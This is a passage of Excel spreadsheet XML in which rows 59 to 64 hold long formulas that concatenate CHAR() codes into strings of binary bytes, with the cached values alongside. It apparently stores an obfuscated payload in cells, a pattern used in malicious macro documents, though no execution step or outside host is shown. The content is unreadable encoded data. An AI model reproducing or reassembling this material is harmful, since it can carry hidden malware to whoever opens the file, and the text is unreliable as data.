        <v>ÿöÀÛ,±O¾`¸rI&lt;ãµ_x000F_7Úü'^ó˜fÝ–è_x000E_é‚þYÇ_x0017_éSi“_x0010_†¥»_x001B_Ä‰_x001C_ÿg@\_x0017_h­˜É´&lt;3u_x0018_ Qá'¥Ð€k ìÕzJP#9‡÷_x0007_
_x000D_q#ð”Ùº_x0004_Ò\n5
t5;µÃüSJg|IŸáì‘­_x001D_aX• _x001F__x001D_š½hP_x0018_ê}mƒf)ûFÖ_®_x0003_ŠçÛ_x001B_ÊKÓSiÿØÞã“ž÷C¤_x0004_îbÜZÀ_x0004_	|ÈŒŸ_x0018__x0006_^ùå”~(-š&amp;_x0015_ã_x001A__x001E__x0018__x0013_´îo¨ðð'žT2WE`A—¿1îÀª°b§××&lt;_x0004_•k”Å¼ñ¯¼I_x0015_÷uù¬âÄÞë_x0017_ÖD.-8~ È¥VSW‘€{»ˆÞ×ç_x0002_SWàb_x0015_ú</v>
      </c>
      <c r="C59" t="str">
        <f>CHAR(162)&amp;CHAR(100)&amp;CHAR(163)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(184)&amp;CHAR(41)&amp;CHAR(152)&amp;CHAR(105)&amp;CHAR(32)</f>
        <v xml:space="preserve">¢d£‡µ¸)˜i </v>
      </c>
    </row>
    <row r="60" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B60" t="str">
        <f>CHAR(104)&amp;CHAR(9)&amp;CHAR(220)&amp;CHAR(64)&amp;CHAR(141)&amp;CHAR(167)&amp;CHAR(119)&amp;CHAR(217)&amp;CHAR(163)&amp;CHAR(208)&amp;CHAR(76)&amp;CHAR(178)&amp;CHAR(234)&amp;CHAR(131)&amp;CHAR(155)&amp;CHAR(99)&amp;CHAR(188)&amp;CHAR(207)&amp;CHAR(182)&amp;CHAR(130)&amp;CHAR(127)&amp;CHAR(232)&amp;CHAR(184)&amp;CHAR(242)&amp;CHAR(146)&amp;CHAR(225)&amp;CHAR(140)&amp;CHAR(252)&amp;CHAR(5)&amp;CHAR(65)&amp;CHAR(15)&amp;CHAR(60)&amp;CHAR(106)&amp;CHAR(117)&amp;CHAR(47)&amp;CHAR(147)&amp;CHAR(76)&amp;CHAR(87)&amp;CHAR(252)&amp;CHAR(153)&amp;CHAR(218)&amp;CHAR(166)&amp;CHAR(238)&amp;CHAR(83)&amp;CHAR(147)&amp;CHAR(67)&amp;CHAR(138)&amp;CHAR(181)&amp;CHAR(87)&amp;CHAR(74)&amp;CHAR(119)&amp;CHAR(57)&amp;CHAR(219)&amp;CHAR(8)&amp;CHAR(63)&amp;CHAR(35)&amp;CHAR(152)&amp;CHAR(182)&amp;CHAR(5)&amp;CHAR(51)&amp;CHAR(31)&amp;CHAR(233)&amp;CHAR(95)&amp;CHAR(100)&amp;CHAR(53)&amp;CHAR(30)&amp;CHAR(194)&amp;CHAR(42)&amp;CHAR(185)&amp;CHAR(24)&amp;CHAR(84)&amp;CHAR(234)&amp;CHAR(44)&amp;CHAR(22)&amp;CHAR(103)&amp;CHAR(11)&amp;CHAR(142)&amp;CHAR(255)&amp;CHAR(119)&amp;CHAR(99)&amp;CHAR(60)&amp;CHAR(29)&amp;CHAR(122)&amp;CHAR(122)&amp;CHAR(94)&amp;CHAR(65)&amp;CHAR(10)&amp;CHAR(223)&amp;CHAR(106)&amp;CHAR(242)&amp;CHAR(77)&amp;CHAR(127)&amp;CHAR(12)&amp;CHAR(172)&amp;CHAR(165)&amp;CHAR(232)&amp;CHAR(138)&amp;CHAR(1)&amp;CHAR(137)&amp;CHAR(31)&amp;CHAR(216)&amp;CHAR(236)&amp;CHAR(44)&amp;CHAR(10)&amp;CHAR(97)&amp;CHAR(105)&amp;CHAR(131)&amp;CHAR(166)&amp;CHAR(64)&amp;CHAR(10)&amp;CHAR(108)&amp;CHAR(195)&amp;CHAR(92)&amp;CHAR(84)&amp;CHAR(180)&amp;CHAR(157)&amp;CHAR(155)&amp;CHAR(175)&amp;CHAR(212)&amp;CHAR(96)&amp;CHAR(128)&amp;CHAR(8)&amp;CHAR(235)&amp;CHAR(238)&amp;CHAR(98)&amp;CHAR(55)&amp;CHAR(111)&amp;CHAR(12)&amp;CHAR(117)&amp;CHAR(130)&amp;CHAR(128)&amp;CHAR(40)&amp;CHAR(66)&amp;CHAR(15)&amp;CHAR(118)&amp;CHAR(15)&amp;CHAR(255)&amp;CHAR(181)&amp;CHAR(170)&amp;CHAR(227)&amp;CHAR(1)&amp;CHAR(40)&amp;CHAR(194)&amp;CHAR(252)&amp;CHAR(74)&amp;CHAR(191)&amp;CHAR(86)&amp;CHAR(154)&amp;CHAR(160)&amp;CHAR(50)&amp;CHAR(143)&amp;CHAR(142)&amp;CHAR(128)&amp;CHAR(248)&amp;CHAR(41)&amp;CHAR(82)&amp;CHAR(218)&amp;CHAR(178)&amp;CHAR(193)&amp;CHAR(76)&amp;CHAR(156)&amp;CHAR(165)&amp;CHAR(13)&amp;CHAR(180)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(50)&amp;CHAR(215)&amp;CHAR(248)&amp;CHAR(19)&amp;CHAR(239)&amp;CHAR(102)&amp;CHAR(202)&amp;CHAR(165)&amp;CHAR(88)&amp;CHAR(206)&amp;CHAR(67)&amp;CHAR(242)&amp;CHAR(143)&amp;CHAR(226)&amp;CHAR(3)&amp;CHAR(41)&amp;CHAR(206)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(248)&amp;CHAR(208)&amp;CHAR(205)&amp;CHAR(46)&amp;CHAR(223)&amp;CHAR(124)&amp;CHAR(184)&amp;CHAR(8)&amp;CHAR(61)&amp;CHAR(86)&amp;CHAR(89)&amp;CHAR(155)&amp;CHAR(198)&amp;CHAR(134)&amp;CHAR(152)&amp;CHAR(191)&amp;CHAR(251)&amp;CHAR(248)&amp;CHAR(127)&amp;CHAR(249)&amp;CHAR(30)&amp;CHAR(68)&amp;CHAR(225)&amp;CHAR(203)&amp;CHAR(188)&amp;CHAR(76)&amp;CHAR(77)&amp;CHAR(10)&amp;CHAR(216)&amp;CHAR(231)&amp;CHAR(76)&amp;CHAR(13)&amp;CHAR(171)&amp;CHAR(232)&amp;CHAR(197)&amp;CHAR(216)&amp;CHAR(71)&amp;CHAR(35)&amp;CHAR(144)&amp;CHAR(192)&amp;CHAR(173)&amp;CHAR(191)&amp;CHAR(1)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(52)&amp;CHAR(192)&amp;CHAR(213)&amp;CHAR(191)&amp;CHAR(42)&amp;CHAR(95)&amp;CHAR(250)&amp;CHAR(47)&amp;CHAR(20)&amp;CHAR(212)&amp;CHAR(253)&amp;CHAR(255)&amp;CHAR(217)&amp;CHAR(241)&amp;CHAR(111)&amp;CHAR(176)&amp;CHAR(169)&amp;CHAR(16)&amp;CHAR(168)&amp;CHAR(244)&amp;CHAR(182)&amp;CHAR(252)&amp;CHAR(62)&amp;CHAR(169)&amp;CHAR(121)</f>
        <v>h	Ü@§wÙ£ÐL²êƒ›c¼Ï¶‚è¸ò’áŒü_x0005_A_x000F_&lt;ju/“LWü™Ú¦îS“CŠµWJw9Û_x0008_?#˜¶_x0005_3_x001F_é_d5_x001E_Â*¹_x0018_Tê,_x0016_g_x000B_Žÿwc&lt;_x001D_zz^A
ßjòM_x000C_¬¥èŠ_x0001_‰_x001F_Øì,
aiƒ¦@
lÃ\T´›¯Ô`€_x0008_ëîb7o_x000C_u‚€(B_x000F_v_x000F_ÿµªã_x0001_(ÂüJ¿Vš 2Ž€ø)RÚ²ÁLœ¥_x000D_´RR2×ø_x0013_ïfÊ¥XÎCòâ_x0003_)Î_x0003_ˆøÐÍ.ß|¸_x0008_=VY›Æ†˜¿ûøù_x001E_DáË¼LM
ØçL_x000D_«èÅØG#À­¿_x0001_”þ4ÀÕ¿*_ú/_x0014_ÔýÿÙño°©_x0010_¨ô¶ü&gt;©y</v>
      </c>
      <c r="C60" t="str">
        <f>CHAR(59)&amp;CHAR(192)&amp;CHAR(187)&amp;CHAR(93)&amp;CHAR(212)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(68)</f>
        <v>;À»]ÔÈ!À³D</v>
      </c>
    </row>
    <row r="61" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B61" t="str">
        <f>CHAR(136)&amp;CHAR(105)&amp;CHAR(129)&amp;CHAR(68)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(57)&amp;CHAR(185)&amp;CHAR(21)&amp;CHAR(102)&amp;CHAR(27)&amp;CHAR(157)&amp;CHAR(119)&amp;CHAR(225)&amp;CHAR(248)&amp;CHAR(172)&amp;CHAR(130)&amp;CHAR(215)&amp;CHAR(240)&amp;CHAR(230)&amp;CHAR(229)&amp;CHAR(238)&amp;CHAR(130)&amp;CHAR(67)&amp;CHAR(116)&amp;CHAR(163)&amp;CHAR(138)&amp;CHAR(18)&amp;CHAR(161)&amp;CHAR(177)&amp;CHAR(22)&amp;CHAR(98)&amp;CHAR(186)&amp;CHAR(236)&amp;CHAR(71)&amp;CHAR(219)&amp;CHAR(58)&amp;CHAR(142)&amp;CHAR(167)&amp;CHAR(119)&amp;CHAR(66)&amp;CHAR(110)&amp;CHAR(64)&amp;CHAR(133)&amp;CHAR(26)&amp;CHAR(80)&amp;CHAR(111)&amp;CHAR(249)&amp;CHAR(152)&amp;CHAR(245)&amp;CHAR(116)&amp;CHAR(210)&amp;CHAR(198)&amp;CHAR(215)&amp;CHAR(90)&amp;CHAR(75)&amp;CHAR(165)&amp;CHAR(76)&amp;CHAR(212)&amp;CHAR(173)&amp;CHAR(209)&amp;CHAR(157)&amp;CHAR(119)&amp;CHAR(40)&amp;CHAR(187)&amp;CHAR(5)&amp;CHAR(175)&amp;CHAR(219)&amp;CHAR(55)&amp;CHAR(45)&amp;CHAR(238)&amp;CHAR(136)&amp;CHAR(36)&amp;CHAR(102)&amp;CHAR(221)&amp;CHAR(203)&amp;CHAR(66)&amp;CHAR(80)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(51)&amp;CHAR(8)&amp;CHAR(173)&amp;CHAR(99)&amp;CHAR(244)&amp;CHAR(25)&amp;CHAR(225)&amp;CHAR(114)&amp;CHAR(128)&amp;CHAR(233)&amp;CHAR(26)&amp;CHAR(19)&amp;CHAR(136)&amp;CHAR(114)&amp;CHAR(137)&amp;CHAR(128)&amp;CHAR(9)&amp;CHAR(186)&amp;CHAR(223)&amp;CHAR(253)&amp;CHAR(1)&amp;CHAR(194)&amp;CHAR(53)&amp;CHAR(138)&amp;CHAR(236)&amp;CHAR(218)&amp;CHAR(252)&amp;CHAR(217)&amp;CHAR(51)&amp;CHAR(67)&amp;CHAR(228)&amp;CHAR(186)&amp;CHAR(111)&amp;CHAR(234)&amp;CHAR(10)&amp;CHAR(241)&amp;CHAR(252)&amp;CHAR(154)&amp;CHAR(151)&amp;CHAR(48)&amp;CHAR(26)&amp;CHAR(255)&amp;CHAR(99)&amp;CHAR(156)&amp;CHAR(225)&amp;CHAR(216)&amp;CHAR(28)&amp;CHAR(226)&amp;CHAR(197)&amp;CHAR(188)&amp;CHAR(31)&amp;CHAR(40)&amp;CHAR(174)&amp;CHAR(237)&amp;CHAR(238)&amp;CHAR(50)&amp;CHAR(105)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(210)&amp;CHAR(49)&amp;CHAR(93)&amp;CHAR(234)&amp;CHAR(76)&amp;CHAR(194)&amp;CHAR(185)&amp;CHAR(220)&amp;CHAR(110)&amp;CHAR(129)&amp;CHAR(243)&amp;CHAR(159)&amp;CHAR(68)&amp;CHAR(172)&amp;CHAR(24)&amp;CHAR(240)&amp;CHAR(61)&amp;CHAR(218)&amp;CHAR(121)&amp;CHAR(248)&amp;CHAR(48)&amp;CHAR(58)&amp;CHAR(74)&amp;CHAR(223)&amp;CHAR(123)&amp;CHAR(167)&amp;CHAR(27)&amp;CHAR(104)&amp;CHAR(20)&amp;CHAR(219)&amp;CHAR(72)&amp;CHAR(231)&amp;CHAR(223)&amp;CHAR(187)&amp;CHAR(216)&amp;CHAR(108)&amp;CHAR(154)&amp;CHAR(135)&amp;CHAR(152)&amp;CHAR(228)&amp;CHAR(53)&amp;CHAR(50)&amp;CHAR(136)&amp;CHAR(196)&amp;CHAR(124)&amp;CHAR(71)&amp;CHAR(246)&amp;CHAR(46)&amp;CHAR(62)&amp;CHAR(71)&amp;CHAR(244)&amp;CHAR(234)&amp;CHAR(78)&amp;CHAR(6)&amp;CHAR(174)&amp;CHAR(15)&amp;CHAR(244)&amp;CHAR(109)&amp;CHAR(10)&amp;CHAR(231)&amp;CHAR(231)&amp;CHAR(10)&amp;CHAR(15)&amp;CHAR(72)&amp;CHAR(103)&amp;CHAR(114)&amp;CHAR(90)&amp;CHAR(219)&amp;CHAR(47)&amp;CHAR(78)&amp;CHAR(51)&amp;CHAR(157)&amp;CHAR(135)&amp;CHAR(211)&amp;CHAR(171)&amp;CHAR(134)&amp;CHAR(119)&amp;CHAR(41)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(102)&amp;CHAR(26)&amp;CHAR(237)&amp;CHAR(243)&amp;CHAR(204)&amp;CHAR(164)&amp;CHAR(203)&amp;CHAR(164)&amp;CHAR(151)&amp;CHAR(31)&amp;CHAR(12)&amp;CHAR(56)&amp;CHAR(169)&amp;CHAR(95)&amp;CHAR(212)&amp;CHAR(201)&amp;CHAR(67)&amp;CHAR(13)&amp;CHAR(57)&amp;CHAR(111)&amp;CHAR(53)&amp;CHAR(45)&amp;CHAR(117)&amp;CHAR(65)&amp;CHAR(12)&amp;CHAR(136)&amp;CHAR(138)&amp;CHAR(214)&amp;CHAR(90)&amp;CHAR(252)&amp;CHAR(41)&amp;CHAR(162)&amp;CHAR(248)&amp;CHAR(73)&amp;CHAR(27)&amp;CHAR(85)</f>
        <v>ˆiDûÏ9¹_x0015_f_x001B_wáø¬‚×ðæåî‚Ct£Š_x0012_¡±_x0016_bºìGÛ:Ž§wBn@…_x001A_Poù˜õtÒÆ×ZK¥LÔ­Ñw(»_x0005_¯Û7-îˆ$fÝËBP_x0002_„3_x0008_­cô_x0019_ár€é_x001A__x0013_ˆr‰€	ºßý_x0001_Â5ŠìÚüÙ3Cäºoê
ñüš—0_x001A_ÿcœáØ_x001C_âÅ¼_x001F_(®íî2i_x0002_	Ò1]êLÂ¹ÜnóŸD¬_x0018_ð=Úyø0:Jß{§_x001B_h_x0014_ÛHçß»Ølš‡˜ä52ˆÄ|Gö.&gt;GôêN_x0006_®_x000F_ôm
çç
_x000F_HgrZÛ/N3‡Ó«†w)_x0003__x0003_f_x001A_íóÌ¤Ë¤—_x001F__x000C_8©_ÔÉC_x000D_9o5-uA_x000C_ˆŠÖZü)¢øI_x001B_U</v>
      </c>
      <c r="C61" t="str">
        <f>CHAR(58)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(76)&amp;CHAR(254)&amp;CHAR(217)</f>
        <v>:”þÈ!¥³LþÙ</v>
      </c>
    </row>
    <row r="62" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B62" t="str">
        <f>CHAR(75)&amp;CHAR(49)&amp;CHAR(184)&amp;CHAR(103)&amp;CHAR(161)&amp;CHAR(5)&amp;CHAR(150)&amp;CHAR(5)&amp;CHAR(98)&amp;CHAR(101)&amp;CHAR(221)&amp;CHAR(158)&amp;CHAR(54)&amp;CHAR(148)&amp;CHAR(166)&amp;CHAR(159)&amp;CHAR(130)&amp;CHAR(103)&amp;CHAR(116)&amp;CHAR(210)&amp;CHAR(154)&amp;CHAR(237)&amp;CHAR(136)&amp;CHAR(71)&amp;CHAR(193)&amp;CHAR(226)&amp;CHAR(202)&amp;CHAR(209)&amp;CHAR(228)&amp;CHAR(211)&amp;CHAR(237)&amp;CHAR(34)&amp;CHAR(76)&amp;CHAR(86)&amp;CHAR(213)&amp;CHAR(10)&amp;CHAR(146)&amp;CHAR(48)&amp;CHAR(56)&amp;CHAR(100)&amp;CHAR(89)&amp;CHAR(179)&amp;CHAR(58)&amp;CHAR(212)&amp;CHAR(7)&amp;CHAR(95)&amp;CHAR(255)&amp;CHAR(142)&amp;CHAR(104)&amp;CHAR(80)&amp;CHAR(210)&amp;CHAR(255)&amp;CHAR(73)&amp;CHAR(62)&amp;CHAR(77)&amp;CHAR(22)&amp;CHAR(174)&amp;CHAR(228)&amp;CHAR(102)&amp;CHAR(133)&amp;CHAR(187)&amp;CHAR(183)&amp;CHAR(112)&amp;CHAR(112)&amp;CHAR(162)&amp;CHAR(126)&amp;CHAR(104)&amp;CHAR(92)&amp;CHAR(196)&amp;CHAR(53)&amp;CHAR(73)&amp;CHAR(252)&amp;CHAR(171)&amp;CHAR(3)&amp;CHAR(143)&amp;CHAR(185)&amp;CHAR(163)&amp;CHAR(140)&amp;CHAR(31)&amp;CHAR(253)&amp;CHAR(144)&amp;CHAR(131)&amp;CHAR(52)&amp;CHAR(137)&amp;CHAR(156)&amp;CHAR(210)&amp;CHAR(154)&amp;CHAR(160)&amp;CHAR(101)&amp;CHAR(47)&amp;CHAR(65)&amp;CHAR(200)&amp;CHAR(92)&amp;CHAR(231)&amp;CHAR(30)&amp;CHAR(165)&amp;CHAR(154)&amp;CHAR(198)&amp;CHAR(121)&amp;CHAR(64)&amp;CHAR(220)&amp;CHAR(208)&amp;CHAR(228)&amp;CHAR(57)&amp;CHAR(42)&amp;CHAR(240)&amp;CHAR(8)&amp;CHAR(41)&amp;CHAR(181)&amp;CHAR(192)&amp;CHAR(196)&amp;CHAR(39)&amp;CHAR(234)&amp;CHAR(235)&amp;CHAR(37)&amp;CHAR(36)&amp;CHAR(160)&amp;CHAR(90)&amp;CHAR(227)&amp;CHAR(145)&amp;CHAR(125)&amp;CHAR(228)&amp;CHAR(16)&amp;CHAR(22)&amp;CHAR(71)&amp;CHAR(49)&amp;CHAR(190)&amp;CHAR(132)&amp;CHAR(13)&amp;CHAR(17)&amp;CHAR(188)&amp;CHAR(159)&amp;CHAR(77)&amp;CHAR(204)&amp;CHAR(67)&amp;CHAR(97)&amp;CHAR(190)&amp;CHAR(199)&amp;CHAR(177)&amp;CHAR(210)&amp;CHAR(197)&amp;CHAR(20)&amp;CHAR(102)&amp;CHAR(107)&amp;CHAR(170)&amp;CHAR(23)&amp;CHAR(68)&amp;CHAR(77)&amp;CHAR(97)&amp;CHAR(113)&amp;CHAR(196)&amp;CHAR(48)&amp;CHAR(153)&amp;CHAR(157)&amp;CHAR(47)&amp;CHAR(144)&amp;CHAR(107)&amp;CHAR(219)&amp;CHAR(19)&amp;CHAR(143)&amp;CHAR(140)&amp;CHAR(96)&amp;CHAR(86)&amp;CHAR(1)&amp;CHAR(79)&amp;CHAR(128)&amp;CHAR(164)&amp;CHAR(158)&amp;CHAR(160)&amp;CHAR(27)&amp;CHAR(61)&amp;CHAR(169)&amp;CHAR(177)&amp;CHAR(165)&amp;CHAR(106)&amp;CHAR(230)&amp;CHAR(97)&amp;CHAR(35)&amp;CHAR(195)&amp;CHAR(165)&amp;CHAR(103)&amp;CHAR(114)&amp;CHAR(238)&amp;CHAR(160)&amp;CHAR(121)&amp;CHAR(87)&amp;CHAR(17)&amp;CHAR(58)&amp;CHAR(101)&amp;CHAR(181)&amp;CHAR(181)&amp;CHAR(106)&amp;CHAR(184)&amp;CHAR(67)&amp;CHAR(43)&amp;CHAR(177)&amp;CHAR(151)&amp;CHAR(242)&amp;CHAR(179)&amp;CHAR(84)&amp;CHAR(218)&amp;CHAR(114)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(27)&amp;CHAR(237)&amp;CHAR(189)&amp;CHAR(218)&amp;CHAR(90)&amp;CHAR(165)&amp;CHAR(98)&amp;CHAR(212)&amp;CHAR(78)&amp;CHAR(125)&amp;CHAR(156)&amp;CHAR(67)&amp;CHAR(39)&amp;CHAR(149)&amp;CHAR(107)&amp;CHAR(4)&amp;CHAR(208)&amp;CHAR(156)&amp;CHAR(57)&amp;CHAR(213)&amp;CHAR(121)&amp;CHAR(3)&amp;CHAR(157)&amp;CHAR(193)&amp;CHAR(229)&amp;CHAR(39)&amp;CHAR(29)&amp;CHAR(189)&amp;CHAR(178)&amp;CHAR(199)&amp;CHAR(49)&amp;CHAR(247)&amp;CHAR(219)&amp;CHAR(122)&amp;CHAR(109)&amp;CHAR(244)&amp;CHAR(138)&amp;CHAR(216)&amp;CHAR(160)&amp;CHAR(66)&amp;CHAR(186)&amp;CHAR(15)&amp;CHAR(135)&amp;CHAR(141)&amp;CHAR(233)&amp;CHAR(180)&amp;CHAR(159)&amp;CHAR(236)&amp;CHAR(191)&amp;CHAR(190)&amp;CHAR(194)</f>
        <v>K1¸g¡_x0005_–_x0005_beÝž6”¦Ÿ‚gtÒšíˆGÁâÊÑäÓí"LVÕ
’08dY³:Ô_x0007__ÿŽhPÒÿI&gt;M_x0016_®äf…»·pp¢~h\Ä5Iü«_x0003_¹£Œ_x001F_ýƒ4‰œÒš e/AÈ\ç_x001E_¥šÆy@ÜÐä9*ð_x0008_)µÀÄ'êë%$ Zã‘}ä_x0010__x0016_G1¾„_x000D__x0011_¼ŸMÌCa¾Ç±ÒÅ_x0014_fkª_x0017_DMaqÄ0™/kÛ_x0013_Œ`V_x0001_O€¤ž _x001B_=©±¥jæa#Ã¥grî yW_x0011_:eµµj¸C+±—ò³TÚrA-_x001B_í½ÚZ¥bÔN}œC'•k_x0004_Ðœ9Õy_x0003_Áå'_x001D_½²Ç1÷ÛzmôŠØ Bº_x000F_‡é´Ÿì¿¾Â</v>
      </c>
      <c r="C62" t="str">
        <f>CHAR(158)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(237)&amp;CHAR(112)&amp;CHAR(207)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(93)&amp;CHAR(196)</f>
        <v>žC!ípÏ[ù]Ä</v>
      </c>
    </row>
    <row r="63" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B63" t="str">
        <f>CHAR(8)&amp;CHAR(245)&amp;CHAR(250)&amp;CHAR(31)&amp;CHAR(80)&amp;CHAR(15)&amp;CHAR(184)&amp;CHAR(51)&amp;CHAR(236)&amp;CHAR(156)&amp;CHAR(220)&amp;CHAR(115)&amp;CHAR(122)&amp;CHAR(54)&amp;CHAR(68)&amp;CHAR(206)&amp;CHAR(198)&amp;CHAR(229)&amp;CHAR(139)&amp;CHAR(216)&amp;CHAR(155)&amp;CHAR(254)&amp;CHAR(242)&amp;CHAR(157)&amp;CHAR(178)&amp;CHAR(74)&amp;CHAR(161)&amp;CHAR(88)&amp;CHAR(10)&amp;CHAR(57)&amp;CHAR(100)&amp;CHAR(12)&amp;CHAR(3)&amp;CHAR(98)&amp;CHAR(122)&amp;CHAR(122)&amp;CHAR(222)&amp;CHAR(166)&amp;CHAR(198)&amp;CHAR(27)&amp;CHAR(189)&amp;CHAR(76)&amp;CHAR(198)&amp;CHAR(216)&amp;CHAR(156)&amp;CHAR(228)&amp;CHAR(123)&amp;CHAR(43)&amp;CHAR(34)&amp;CHAR(20)&amp;CHAR(225)&amp;CHAR(36)&amp;CHAR(197)&amp;CHAR(39)&amp;CHAR(21)&amp;CHAR(153)&amp;CHAR(231)&amp;CHAR(217)&amp;CHAR(160)&amp;CHAR(160)&amp;CHAR(169)&amp;CHAR(80)&amp;CHAR(113)&amp;CHAR(192)&amp;CHAR(215)&amp;CHAR(95)&amp;CHAR(45)&amp;CHAR(31)&amp;CHAR(105)&amp;CHAR(127)&amp;CHAR(115)&amp;CHAR(188)&amp;CHAR(55)&amp;CHAR(38)&amp;CHAR(198)&amp;CHAR(175)&amp;CHAR(26)&amp;CHAR(242)&amp;CHAR(115)&amp;CHAR(84)&amp;CHAR(123)&amp;CHAR(220)&amp;CHAR(213)&amp;CHAR(170)&amp;CHAR(219)&amp;CHAR(141)&amp;CHAR(41)&amp;CHAR(187)&amp;CHAR(149)&amp;CHAR(34)&amp;CHAR(103)&amp;CHAR(7)&amp;CHAR(166)&amp;CHAR(245)&amp;CHAR(146)&amp;CHAR(230)&amp;CHAR(170)&amp;CHAR(3)&amp;CHAR(111)&amp;CHAR(36)&amp;CHAR(151)&amp;CHAR(91)&amp;CHAR(87)&amp;CHAR(106)&amp;CHAR(38)&amp;CHAR(106)&amp;CHAR(126)&amp;CHAR(189)&amp;CHAR(57)&amp;CHAR(100)&amp;CHAR(245)&amp;CHAR(85)&amp;CHAR(213)&amp;CHAR(95)&amp;CHAR(42)&amp;CHAR(184)&amp;CHAR(59)&amp;CHAR(143)&amp;CHAR(203)&amp;CHAR(30)&amp;CHAR(31)&amp;CHAR(76)&amp;CHAR(156)&amp;CHAR(125)&amp;CHAR(66)&amp;CHAR(10)&amp;CHAR(60)&amp;CHAR(149)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(178)&amp;CHAR(2)&amp;CHAR(254)&amp;CHAR(32)&amp;CHAR(124)&amp;CHAR(91)&amp;CHAR(187)&amp;CHAR(248)&amp;CHAR(47)&amp;CHAR(19)&amp;CHAR(245)&amp;CHAR(222)&amp;CHAR(180)&amp;CHAR(22)&amp;CHAR(93)&amp;CHAR(201)&amp;CHAR(39)&amp;CHAR(168)&amp;CHAR(192)&amp;CHAR(79)&amp;CHAR(141)&amp;CHAR(93)&amp;CHAR(225)&amp;CHAR(87)&amp;CHAR(111)&amp;CHAR(91)&amp;CHAR(196)&amp;CHAR(162)&amp;CHAR(107)&amp;CHAR(140)&amp;CHAR(202)&amp;CHAR(46)&amp;CHAR(229)&amp;CHAR(44)&amp;CHAR(66)&amp;CHAR(73)&amp;CHAR(62)&amp;CHAR(55)&amp;CHAR(46)&amp;CHAR(206)&amp;CHAR(168)&amp;CHAR(37)&amp;CHAR(234)&amp;CHAR(123)&amp;CHAR(202)&amp;CHAR(164)&amp;CHAR(205)&amp;CHAR(24)&amp;CHAR(168)&amp;CHAR(170)&amp;CHAR(212)&amp;CHAR(151)&amp;CHAR(131)&amp;CHAR(34)&amp;CHAR(145)&amp;CHAR(238)&amp;CHAR(185)&amp;CHAR(110)&amp;CHAR(32)&amp;CHAR(219)&amp;CHAR(247)&amp;CHAR(77)&amp;CHAR(100)&amp;CHAR(3)&amp;CHAR(83)&amp;CHAR(164)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(191)&amp;CHAR(127)&amp;CHAR(235)&amp;CHAR(170)&amp;CHAR(8)&amp;CHAR(159)&amp;CHAR(49)&amp;CHAR(215)&amp;CHAR(31)&amp;CHAR(151)&amp;CHAR(58)&amp;CHAR(150)&amp;CHAR(124)&amp;CHAR(183)&amp;CHAR(79)&amp;CHAR(130)&amp;CHAR(1)&amp;CHAR(205)&amp;CHAR(50)&amp;CHAR(116)&amp;CHAR(152)&amp;CHAR(74)&amp;CHAR(124)&amp;CHAR(72)&amp;CHAR(88)&amp;CHAR(198)&amp;CHAR(7)&amp;CHAR(151)&amp;CHAR(153)&amp;CHAR(140)&amp;CHAR(125)&amp;CHAR(74)&amp;CHAR(98)&amp;CHAR(105)&amp;CHAR(198)&amp;CHAR(17)&amp;CHAR(44)&amp;CHAR(180)&amp;CHAR(5)&amp;CHAR(164)&amp;CHAR(113)&amp;CHAR(119)&amp;CHAR(125)&amp;CHAR(103)&amp;CHAR(133)&amp;CHAR(134)&amp;CHAR(141)&amp;CHAR(106)&amp;CHAR(77)&amp;CHAR(208)&amp;CHAR(76)&amp;CHAR(174)&amp;CHAR(137)&amp;CHAR(61)&amp;CHAR(158)&amp;CHAR(201)&amp;CHAR(194)</f>
        <v>_x0008_õú_x001F_P_x000F_¸3ìœÜsz6DÎÆå‹Ø›þò²J¡X
9d_x000C__x0003_bzzÞ¦Æ_x001B_½LÆØœä{+"_x0014_á$Å'_x0015_™çÙ  ©PqÀ×_-_x001F_is¼7&amp;Æ¯_x001A_òsT{ÜÕªÛ)»•"g_x0007_¦õ’æª_x0003_o$—[Wj&amp;j~½9dõUÕ_*¸;Ë_x001E__x001F_Lœ}B
&lt;•A#²_x0002_þ |[»ø/_x0013_õÞ´_x0016_]É'¨ÀO]áWo[Ä¢kŒÊ.å,BI&gt;7.Î¨%ê{Ê¤Í_x0018_¨ªÔ—ƒ"‘î¹n Û÷Md_x0003_S¤_x0002_Ž¿ëª_x0008_Ÿ1×_x001F_—:–|·O‚_x0001_Í2t˜J|HXÆ_x0007_—™Œ}JbiÆ_x0011_,´_x0005_¤qw}g…†jMÐL®‰=žÉÂ</v>
      </c>
      <c r="C63" t="str">
        <f>CHAR(4)&amp;CHAR(141)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(249)&amp;CHAR(85)&amp;CHAR(9)&amp;CHAR(73)&amp;CHAR(237)</f>
        <v>_x0004_ûÏ&gt;ùU	Ií</v>
      </c>
    </row>
    <row r="64" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B64" t="str">
